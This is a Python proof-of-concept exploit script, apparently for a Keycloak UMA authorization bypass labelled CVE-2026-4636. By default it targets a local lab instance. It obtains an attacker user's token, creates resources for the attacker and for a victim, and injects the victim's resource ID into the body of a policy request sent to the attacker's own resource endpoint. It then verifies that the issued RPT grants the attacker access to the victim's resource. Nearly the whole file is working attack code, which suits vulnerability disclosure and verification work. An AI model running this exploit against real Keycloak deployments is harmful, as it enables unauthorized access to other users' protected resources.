#!/usr/bin/env python3
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


ROOT = os.path.dirname(os.path.abspath(__file__))
DEFAULT_EVIDENCE = os.path.abspath(os.path.join(ROOT, "..", "evidence"))
EVIDENCE_DIR = os.environ.get("EVIDENCE_DIR", DEFAULT_EVIDENCE)
SEED_FILE = os.environ.get("SEED_FILE", "/opt/keycloak-data/seed-info.json")

BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:8080")
REALM = os.environ.get("REALM", "anypoc")
CLIENT_ID = os.environ.get("CLIENT_ID", "resource-server-test")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "secret")
ATTACKER_USER = os.environ.get("ATTACKER_USER", "marta")
ATTACKER_PASS = os.environ.get("ATTACKER_PASS", "password")
VICTIM_USER = os.environ.get("VICTIM_USER", "kolo")
SCOPE = os.environ.get("POC_SCOPE", "Scope A")


def load_seed():
    global BASE_URL, REALM, CLIENT_ID, CLIENT_SECRET, ATTACKER_USER, ATTACKER_PASS, VICTIM_USER
    try:
        with open(SEED_FILE, "r", encoding="utf-8") as f:
            seed = json.load(f)
    except FileNotFoundError:
        return {}

    BASE_URL = seed.get("base_url", BASE_URL)
    REALM = seed.get("realm", REALM)
    client = seed.get("client", {})
    CLIENT_ID = client.get("client_id", CLIENT_ID)
    CLIENT_SECRET = client.get("client_secret", CLIENT_SECRET)
    attacker = seed.get("attacker", {})
    victim = seed.get("victim", {})
    ATTACKER_USER = attacker.get("username", ATTACKER_USER)
    ATTACKER_PASS = attacker.get("password", ATTACKER_PASS)
    VICTIM_USER = victim.get("username", VICTIM_USER)
    return seed


def ensure_dir(path):
    os.makedirs(path, exist_ok=True)


def write_text(name, content):
    with open(os.path.join(EVIDENCE_DIR, name), "w", encoding="utf-8") as f:
        f.write(content)


def write_json(name, obj):
    write_text(name, json.dumps(obj, indent=2, sort_keys=True) + "\n")


def http_json(method, url, obj=None, headers=None):
    data = None
    hdrs = dict(headers or {})
    if obj is not None:
        data = json.dumps(obj).encode("utf-8")
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            text = resp.read().decode("utf-8")
            return resp.status, dict(resp.headers), text
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read().decode("utf-8")


def http_form(url, fields, headers=None):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    hdrs = {"Content-Type": "application/x-www-form-urlencoded", **(headers or {})}
    req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            text = resp.read().decode("utf-8")
            return resp.status, dict(resp.headers), text
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read().decode("utf-8")


def parse_json(text):
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return {"raw": text}


def wait_ready():
    ready_url = BASE_URL.replace(":8080", ":9000") + "/health/ready"
    for _ in range(60):
        try:
            status, _, _ = http_json("GET", ready_url)
            if status == 200:
                return
        except Exception:
            pass
        time.sleep(1)
    raise RuntimeError(f"Keycloak readiness check failed at {ready_url}")


def token_endpoint():
    return f"{BASE_URL}/realms/{REALM}/protocol/openid-connect/token"


def protection_base():
    return f"{BASE_URL}/realms/{REALM}/authz/protection"


def get_password_token(username, password):
    fields = {
        "grant_type": "password",
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "username": username,
        "password": password,
    }
    status, headers, text = http_form(token_endpoint(), fields)
    write_json(f"token_{username}_response.json", parse_json(text))
    if status != 200:
        raise RuntimeError(f"failed to obtain token for {username}: HTTP {status}: {text}")
    return parse_json(text)["access_token"]


def get_service_token():
    fields = {
        "grant_type": "client_credentials",
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
    }
    status, _, text = http_form(token_endpoint(), fields)
    write_json("token_service_account_response.json", parse_json(text))
    if status != 200:
        raise RuntimeError(f"failed to obtain service-account setup token: HTTP {status}: {text}")
    return parse_json(text)["access_token"]


def create_resource(access_token, name, owner=None):
    payload = {
        "name": name,
        "ownerManagedAccess": True,
        "scopes": [{"name": "Scope A"}, {"name": "Scope B"}, {"name": "Scope C"}],
        "attributes": {"anypoc": ["cve-2026-4636-poc"]},
    }
    if owner:
        payload["owner"] = owner
    status, _, text = http_json(
        "POST",
        f"{protection_base()}/resource_set",
        payload,
        {"Authorization": f"Bearer {access_token}"},
    )
    if status != 201:
        raise RuntimeError(f"resource creation failed for {name}: HTTP {status}: {text}")
    body = parse_json(text)
    return body["_id"], payload, body


def request_authorization(attacker_token, resource_id, label):
    fields = {
        "grant_type": "urn:ietf:params:oauth:grant-type:uma-ticket",
        "audience": CLIENT_ID,
        "permission": f"{resource_id}#{SCOPE}",
    }
    status, headers, text = http_form(
        token_endpoint(),
        fields,
        {"Authorization": f"Bearer {attacker_token}"},
    )
    write_json(f"{label}_authorization_response.json", parse_json(text))
    return status, parse_json(text)


def decode_jwt_payload(jwt):
    payload = jwt.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode("ascii")).decode("utf-8"))


def create_malicious_policy(attacker_token, attacker_resource_id, victim_resource_id):
    payload = {
        "name": f"cve-2026-4636-cross-resource-{int(time.time())}",
        "description": "PoC: URL resource is attacker-owned, body injects victim resource",
        "resources": [attacker_resource_id, victim_resource_id],
        "users": [ATTACKER_USER],
        "scopes": [SCOPE],
    }
    endpoint = f"{protection_base()}/uma-policy/{attacker_resource_id}"
    raw_request = (
        f"POST {endpoint} HTTP/1.1\n"
        f"Authorization: Bearer <marta access token>\n"
        "Content-Type: application/json\n\n"
        f"{json.dumps(payload, indent=2, sort_keys=True)}\n"
    )
    write_text("policy_creation_request.http", raw_request)
    write_json("policy_creation_request.json", payload)
    status, headers, text = http_json(
        "POST",
        endpoint,
        payload,
        {"Authorization": f"Bearer {attacker_token}"},
    )
    write_text(
        "policy_creation_response.http",
        f"HTTP {status}\n"
        + "".join(f"{k}: {v}\n" for k, v in headers.items())
        + "\n"
        + text
        + "\n",
    )
    write_json("policy_creation_response.json", parse_json(text))
    return status, parse_json(text)


def main():
    ensure_dir(EVIDENCE_DIR)
    seed = load_seed()
    write_json("seed_info_used.json", seed)
    wait_ready()

    marta_token = get_password_token(ATTACKER_USER, ATTACKER_PASS)
    service_token = get_service_token()

    run_id = int(time.time() * 1000)
    attacker_resource_id, attacker_req, attacker_res = create_resource(
        marta_token,
        f"PoC Marta Path Resource {run_id}",
    )
    victim_resource_id, victim_req, victim_res = create_resource(
        service_token,
        f"PoC Kolo Victim Resource {run_id}",
        owner=VICTIM_USER,
    )
    write_json("resource_setup.json", {
        "attacker_create_request": attacker_req,
        "attacker_create_response": attacker_res,
        "victim_create_request": victim_req,
        "victim_create_response": victim_res,
        "attacker_resource_id": attacker_resource_id,
        "victim_resource_id": victim_resource_id,
    })

    pre_status, pre_body = request_authorization(marta_token, victim_resource_id, "pre_exploit")
    if pre_status == 200:
        raise RuntimeError("pre-exploit authorization unexpectedly succeeded; target was not clean")

    policy_status, policy_body = create_malicious_policy(marta_token, attacker_resource_id, victim_resource_id)
    if policy_status not in (200, 201):
        raise RuntimeError(f"malicious UMA policy was rejected: HTTP {policy_status}: {policy_body}")

    post_status, post_body = request_authorization(marta_token, victim_resource_id, "post_exploit")
    if post_status != 200 or "access_token" not in post_body:
        raise RuntimeError(f"post-exploit authorization did not succeed: HTTP {post_status}: {post_body}")

    rpt_payload = decode_jwt_payload(post_body["access_token"])
    write_json("post_exploit_rpt_payload.json", rpt_payload)
    permissions = rpt_payload.get("authorization", {}).get("permissions", [])
    matched = [
        p for p in permissions
        if p.get("rsid") == victim_resource_id and SCOPE in p.get("scopes", [])
    ]
    if not matched:
        raise RuntimeError("RPT did not contain the victim resource permission")

    summary = {
        "result": "VULNERABLE",
        "pre_exploit_status": pre_status,
        "policy_creation_status": policy_status,
        "post_exploit_status": post_status,
        "attacker_user": ATTACKER_USER,
        "attacker_resource_id": attacker_resource_id,
        "victim_user": VICTIM_USER,
        "victim_resource_id": victim_resource_id,
        "granted_permission": matched[0],
    }
    write_json("summary.json", summary)
    print(json.dumps(summary, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:
        ensure_dir(EVIDENCE_DIR)
        write_text("failure.txt", f"{type(exc).__name__}: {exc}\n")
        print(f"PoC failed: {exc}", file=sys.stderr)
        sys.exit(1)
